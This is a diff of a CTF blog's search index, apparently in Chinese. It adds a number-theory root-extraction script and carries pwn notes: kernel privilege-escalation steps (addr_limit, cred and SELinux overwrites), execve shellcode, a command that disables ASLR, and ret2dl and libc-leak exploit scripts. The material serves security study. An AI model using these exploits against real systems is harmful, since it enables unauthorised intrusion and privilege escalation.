@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[一些有关数论的脚本]]></title>
+    <url>%2F2020%2F02%2F12%2F%E4%B8%80%E4%BA%9B%E6%9C%89%E5%85%B3%E6%95%B0%E8%AE%BA%E7%9A%84%E8%84%9A%E6%9C%AC%2F</url>
+    <content type="text"><![CDATA[简介一些在网上看到的数论脚本 Adleman-Manders-Miller rth Root Extraction Method用处：在有限域内开N次根（脚本出处[http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html]）12345678910111213141516171819202122232425262728293031323334353637383940414243444546import randomimport time​# About 3 seconds to rundef AMM(o, r, q): start = time.time() print(&apos;\n----------------------------------------------------------------------------------&apos;) print(&apos;Start to run Adleman-Manders-Miller Root Extraction Method&apos;) print(&apos;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&apos;.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print(&apos;[+] Find p:&#123;&#125;&apos;.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print(&apos;[+] Find s:&#123;&#125;, t:&#123;&#125;&apos;.format(s, t)) k = 1 while (k * s + 1) % r != 0: k += 1 alp = (k * s + 1) // r print(&apos;[+] Find alp:&#123;&#125;&apos;.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print(&apos;[+] Calculating DLP...&apos;) j = - dicreat_log(a, d) print(&apos;[+] Finish DLP...&apos;) b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) print(&apos;Find one solution: &#123;&#125;&apos;.format(result)) return result]]></content>
+      <categories>
+        <category>Crypto</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Crypto</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Xman笔记]]></title>
     <url>%2F2020%2F01%2F11%2FXman%E7%AC%94%E8%AE%B0%2F</url>
     <content type="text"><![CDATA[简介在Xman随便记的一点东西 standard/usr/bin/x86_64/usr/bin/i386 堆喷射堆风水 TK 完美越过DEP和ASLR 袁哥dve bypass mprotect改权限dl_resolve malloc_hook写one_gadget不行可以写relloc_hook然后写one_gadget 没有设置stdin缓冲区的时候，使用scanf、getchar获取内容时，如果输入字符串比较长会调用 malloc 来分配内存，所以可以把fastbin放入smallbin kernelcpio -idmv &lt; .cpiofind . | cpio -o -H newc &gt; .cpio find . | cpio -o –format=newc &gt; ../rootfs.img etc/init/rcS /proc/kallsyms 记录了所有函数地址 32位：pushl iret64位：pushq iretq编译用-no-pie调试加/dev/null -s ./extract-vmlinux ./bzImage &gt; vmlinux swapgs qemu-system-i386 -hda ./rootfs.img -kernel linux/arch/x86/boot/bzImage -append ‘console=ttyS0 root=/dev/sda rw nokaslr quiet’ -m 128M -nographic -s -monitor /dev/null set architecture i386:x64-32gdb ./vmlinuxtarget remote:1234b net/sctp/socket.c:1846gcc exp.c -o exp -pthread -lsctp –static lsmod获取基地址ida改基地址 edit-&gt;segements-&gt;rebaseset architecture i386:x86-64add-symbol-file ./baby.ko 0xFFFFFFFFC0002000 ida鼠标移动到要的地方 按tab cat /proc/kallsyms | grep commit_credscat /proc/kallsyms | grep prepare_kernel_cred ./extract-vmlinux bzImage &gt;&gt; vmlinux lsmodcat /proc/cpuinfocat /proc/slabinfo 深入理解计算机系统 armrizzo恢复符号表qemu-arm-static -g 1234 ./typogdb-multiarch ./typotarget remote:1234 context.arch = ‘arm’context.arch = ‘arm64’ qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./baby_armbinwalk -ME提取文件1.固件的文件系统附带提取程序2.GPL(源码)可能包含加密解密的逻辑ASLR=1 brk分配的堆不随机化ASLR=2 全随机化 /usr/arm-linux-gnueabihf android通过PC最低位来切换1: ARM -&gt; THUM0: THUM -&gt; ARM ARM流水线：指令执行时PC已经指向下下条指令 ARM64: W0-W30来访问X0-X30的低32位 Dalvik/ART:ART通过硬编码来提升速度 • /dev/binder – framework和app之间IPC通信桥梁• /dev/hwbinder（8.0之后） – framework和vendor之间的IPC通信桥梁• /dev/vndbinder（8.0之后） – vendor和vendor之间的IPC通信桥梁 PAN（Privileged Access Never） 相当于SMAPPXN（Privileged Execute Never） 相当于SMEP SECCOMP:Android8.0之后，影响所有zygote孵化出来的进程shell中执行exp不会受到限制apk中执行exp会受到seccomp限制 - 比如无法调用setuid、chroot、mount等 AVB（Android Verified Boot 启动时验证） – 启动时验证boot、system、vendor等是否被篡改 – Persistent root克星 – 8.0之后的通过漏洞的root方案都是非persistent – Magisk使用tmpfs临时挂载system等分区AVB2.0 回滚保护，防止回滚到有漏洞的版本 内核栈和thread_info共用一片内存区域 1234union thread_union&#123; struct thread_info thread_info; unsigned long stack[THREAD_SIZE/sizeof(long)]; &#125;; addr_limit 用户态0x7ffffffff000(没有kaslr) 12345678struct thread_info &#123; unsigned long flags; /* low level flags */ mm_segment_t addr_limit; /* address limit */ struct task_struct *task; /* main task structure */ struct exec_domain *exec_domain; /* execution domain */ struct restart_block restart_block; int preempt_count; /* 0 =&gt; preemptable, &lt;0 =&gt; bug */ int cpu; /* cpu */ &#125;; 123456789101112131415161718struct task_struct &#123; volatile long state; /* -1 unrunnable, 0 runnable, &gt;0 stopped */ void *stack; // contains addr_limit unsigned int flags; /* per process flags, defined below */ ... struct list_head tasks; ... struct mm_struct *mm, *active_mm; #ifdef CONFIG_COMPAT_BRK unsigned brk_randomized:1; ... /* process credentials */ const struct cred __rcu *real_cred; /* objective and real subjective task const struct cred __rcu *cred; /* effective (overridable) subjective task char comm[TASK_COMM_LEN]; ... struct seccomp seccomp; &#125; 找到一个task_struct即可以找到其他所有task_struct 双链表保存123struct list_head &#123; struct list_head *next, *prev; &#125;; 内核关键全局变量 – selinux_enforcing – selinux_enabled – init_task 关闭addr_limit(绕过PXN) 内核线程栈底偏移8字节即为addr_limit 将addr_limit改为-1（ 0xffffffffffffffff） 关闭之后即可任意读写内核 关闭DAC 修改进程安全凭证cred中进程id相关值 uid、gid等改为init进程的值 关闭CAP 修改进程安全凭证cred中的cap相关值 cap_inheritable等改为init进程的值 关闭SELinux 修改SELinux相关关键全局变量 selinux_enforcing和selinux_enabled置0 修改进程安全凭证cred中的security安全域 osid、sid、exec_sid、create_sid、keycreate_sid、 sockcreate_sid修改为init进程的值 关闭SECCOMP 修改thread_info中的flags，将seccomp位置0 #define TIF_SECCOMP 11 #define _TIF_SECCOMP (1 &lt;&lt; TIF_SECCOMP) 修改task_struct中的seccomp中的mode为0 struct seccomp { int mode; struct seccomp_filter *filter; }; 内核任意地址读写 用户态不能直接访问内核态 0xffffffffffffff00 = 0 (X) 需要借助内核函数完成内核任意地址读写 系统调用由内核完成 寻找系统调用中判断参数合法的方式 -&gt; addr_limit read/write、readv/writev、recvmsg/sendmsg等 这些命令会check addr_limit，所以就可以写内核]]></content>
@@ -32,7 +44,7 @@
   <entry>
     <title><![CDATA[Pwn的基本操作]]></title>
     <url>%2F2019%2F07%2F15%2FPwn%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%2F</url>
-    <content type="text"><![CDATA[简介本文主要是记录一些Pwn的基本操作的命令 基本内容查找gadgets和string123ROPgadget --binary xxx --only 'pop|ret' | grep 'xxx'ROPgadget --binary xxx --string '/bin/sh' ROPgadget --binary xxx --only 'int' execve(“/bin/sh”,NULL,NULL) 的shellcode123456789shellcode = asm('\n'.join([ 'push %d' % u32('/sh\0'), 'push %d' % u32('/bin'), 'xor edx, edx', 'xor ecx, ecx', 'mov ebx, esp', 'mov eax, 0xb', 'int 0x80',])) 关闭ASLR1sudo sh -c "echo 0 &gt; /proc/sys/kernel/randomize_va_space" gdb下寻找偏移123pattern create 100pattern offset xxxxxxpattern search objdump读取plt表和got表12objdump -d -j .plt xxxobjdump -R xxx gdb中的print和x1234567print $esp:打印esp的值x/10x $esp：打印出10个从esp开始的值x/10x $esp-4：打印出10个从偏移4开始的值x/10gx $esp：以64位格式打印 readelf查看段地址1readelf -S xxx vmmap查看地址是否可读可写可执行1vmmap one_gadget使用1one_gadget /lib/x86_64-linux-gnu/libc.so.6 gdb attach123from pwnlib import *context.terminal = ['gnome-terminal','-x','sh','-c']gdb.attach(p) gdb中算fmt的偏移x(“%x-1$s”)1fmtarg 0x00007fffffffdb28 fmtstr_payload的使用1payload = fmtstr_payload(offset, &#123;puts_got: system_addr&#125;) x64和x86函数调用参数规则12在x64下通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈.在x86下其参数从右往左入栈 readelf查看libc版本1readelf -a xxx ret2dl使用12345678910111213141516171819202122232425from roputils import *#为了防止命名冲突，这个脚本全部只使用roputils中的代码。如果需要使用pwntools中的代码需要在import roputils前import pwn，以使得roputils中的ROP覆盖掉pwntools中的ROProp = ROP('./level4') #ROP继承了ELF类，下面的section, got, plt都是调用父类的方法bss_addr = rop.section('.bss')read_got = rop.got('read')read_plt = rop.plt('read')offset = 140io = Proc(host = '172.17.0.2', port = 10001) #roputils中这里需要显式指定参数名buf = rop.fill(offset) #fill用于生成填充数据buf += rop.call(read_plt, 0, bss_addr, 0x100) #call可以通过某个函数的plt地址方便地进行调用buf += rop.dl_resolve_call(bss_addr+0x20, bss_addr) #dl_resolve_call有一个参数base和一个可选参数列表*args。base为伪造的link_map所在地址，*args为要传递给被劫持调用的函数的参数。这里我们将"/bin/sh\x00"放置在bss_addr处，link_map放置在bss_addr+0x20处io.write(buf)然后我们直接用dl_resolve_data生成伪造的link_map并发送buf = rop.string('/bin/sh') buf += rop.fill(0x20, buf) #如果fill的第二个参数被指定，相当于将第二个参数命名的字符串填充至指定长度buf += rop.dl_resolve_data(bss_addr+0x20, 'system') #dl_resolve_data的参数也非常简单，第一个参数是伪造的link_map首地址，第二个参数是要伪造的函数名buf += rop.fill(0x100, buf)io.write(buf) 使用libc里面的函数1234from ctypes import *libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")libc.srand(1) pwntools自动获取libc12345678910111213141516from pwn import *elf=ELF("level3")main_addr=0x08048484plt_write=elf.plt["write"]def leak(address): p.recvline() payload = "A" * 0x88 + "A" * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(address) + p32(4) p.send(payload) data=p.recv(4) print hex(u32(data)) print "%#x =&gt; %s" % (address,(data or '').encode('hex')) return datap=process("./level3")d=DynELF(leak,elf=ELF("./level3"))system_addr=d.lookup('system','libc')print "system_addr="+hex(system_addr) 更改程序的libc12345678910111213141516171819202122232425262728293031323334353637def change_ld(binary, ld): """ Force to use assigned new ld.so by changing the binary """ if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\0')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) #rwx------ success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path)#exampleelf = change_ld('./pwn', './ld.so')p = elf.process(env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;) 交互函数123456789sd = lambda x : r.send(x)sl = lambda x : r.sendline(x)rv = lambda x = 2048 : r.recv(x)ru = lambda x : r.recvuntil(x)rl = lambda : r.recvline()ia = lambda : r.interactive()ra = lambda : r.recvall()sla = lambda x,y: r.sendlineafter(x,y)sa = lambda x,y : r.sendafter(x,y) libc寻找字符串libc.search(‘/bin/sh’).next()]]></content>
+    <content type="text"><![CDATA[简介本文主要是记录一些Pwn的基本操作的命令 基本内容查找gadgets和string123ROPgadget --binary xxx --only 'pop|ret' | grep 'xxx'ROPgadget --binary xxx --string '/bin/sh' ROPgadget --binary xxx --only 'int' execve(“/bin/sh”,NULL,NULL) 的shellcode123456789shellcode = asm('\n'.join([ 'push %d' % u32('/sh\0'), 'push %d' % u32('/bin'), 'xor edx, edx', 'xor ecx, ecx', 'mov ebx, esp', 'mov eax, 0xb', 'int 0x80',])) 关闭ASLR1sudo sh -c "echo 0 &gt; /proc/sys/kernel/randomize_va_space" gdb下寻找偏移123pattern create 100pattern offset xxxxxxpattern search objdump读取plt表和got表12objdump -d -j .plt xxxobjdump -R xxx gdb中的print和x1234567print $esp:打印esp的值x/10x $esp：打印出10个从esp开始的值x/10x $esp-4：打印出10个从偏移4开始的值x/10gx $esp：以64位格式打印 readelf查看段地址1readelf -S xxx vmmap查看地址是否可读可写可执行1vmmap one_gadget使用1one_gadget /lib/x86_64-linux-gnu/libc.so.6 gdb attach123456from pwnlib import *context.terminal = ['gnome-terminal','-x','sh','-c']context.terminal = ['tmux', 'splitw', '-h']context.terminal = ['tmux', 'splitw', '-v']gdb.attach(p) gdb中算fmt的偏移x(“%x-1$s”)1fmtarg 0x00007fffffffdb28 fmtstr_payload的使用1payload = fmtstr_payload(offset, &#123;puts_got: system_addr&#125;) x64和x86函数调用参数规则12在x64下通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈.在x86下其参数从右往左入栈 readelf查看libc版本1readelf -a xxx ret2dl使用12345678910111213141516171819202122232425from roputils import *#为了防止命名冲突，这个脚本全部只使用roputils中的代码。如果需要使用pwntools中的代码需要在import roputils前import pwn，以使得roputils中的ROP覆盖掉pwntools中的ROProp = ROP('./level4') #ROP继承了ELF类，下面的section, got, plt都是调用父类的方法bss_addr = rop.section('.bss')read_got = rop.got('read')read_plt = rop.plt('read')offset = 140io = Proc(host = '172.17.0.2', port = 10001) #roputils中这里需要显式指定参数名buf = rop.fill(offset) #fill用于生成填充数据buf += rop.call(read_plt, 0, bss_addr, 0x100) #call可以通过某个函数的plt地址方便地进行调用buf += rop.dl_resolve_call(bss_addr+0x20, bss_addr) #dl_resolve_call有一个参数base和一个可选参数列表*args。base为伪造的link_map所在地址，*args为要传递给被劫持调用的函数的参数。这里我们将"/bin/sh\x00"放置在bss_addr处，link_map放置在bss_addr+0x20处io.write(buf)然后我们直接用dl_resolve_data生成伪造的link_map并发送buf = rop.string('/bin/sh') buf += rop.fill(0x20, buf) #如果fill的第二个参数被指定，相当于将第二个参数命名的字符串填充至指定长度buf += rop.dl_resolve_data(bss_addr+0x20, 'system') #dl_resolve_data的参数也非常简单，第一个参数是伪造的link_map首地址，第二个参数是要伪造的函数名buf += rop.fill(0x100, buf)io.write(buf) 使用libc里面的函数1234from ctypes import *libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")libc.srand(1) pwntools自动获取libc12345678910111213141516from pwn import *elf=ELF("level3")main_addr=0x08048484plt_write=elf.plt["write"]def leak(address): p.recvline() payload = "A" * 0x88 + "A" * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(address) + p32(4) p.send(payload) data=p.recv(4) print hex(u32(data)) print "%#x =&gt; %s" % (address,(data or '').encode('hex')) return datap=process("./level3")d=DynELF(leak,elf=ELF("./level3"))system_addr=d.lookup('system','libc')print "system_addr="+hex(system_addr) 更改程序的libc12345678910111213141516171819202122232425262728293031323334353637def change_ld(binary, ld): """ Force to use assigned new ld.so by changing the binary """ if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\0')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) #rwx------ success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path)#exampleelf = change_ld('./pwn', './ld.so')p = elf.process(env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;) 交互函数123456789sd = lambda x : r.send(x)sl = lambda x : r.sendline(x)rv = lambda x = 2048 : r.recv(x)ru = lambda x : r.recvuntil(x)rl = lambda : r.recvline()ia = lambda : r.interactive()ra = lambda : r.recvall()sla = lambda x,y: r.sendlineafter(x,y)sa = lambda x,y : r.sendafter(x,y) libc寻找字符串libc.search(‘/bin/sh’).next()]]></content>
       <categories>
         <category>Pwn</category>
       </categories>
@@ -50,8 +62,8 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Write up</tag>
         <tag>Crypto</tag>
+        <tag>Write up</tag>
         <tag>ECC</tag>
         <tag>Knapsack</tag>
       </tags>
@@ -78,8 +90,8 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Write up</tag>
         <tag>Crypto</tag>
+        <tag>Write up</tag>
         <tag>AES</tag>
       </tags>
   </entry>
@@ -92,8 +104,8 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Write up</tag>
         <tag>Crypto</tag>
+        <tag>Write up</tag>
       </tags>
   </entry>
   <entry>
@@ -105,8 +117,8 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Write up</tag>
         <tag>Crypto</tag>
+        <tag>Write up</tag>
       </tags>
   </entry>
   <entry>
@@ -131,8 +143,8 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Web</tag>
         <tag>Write up</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -157,8 +169,8 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Write up</tag>
         <tag>Crypto</tag>
+        <tag>Write up</tag>
       </tags>
   </entry>
   <entry>
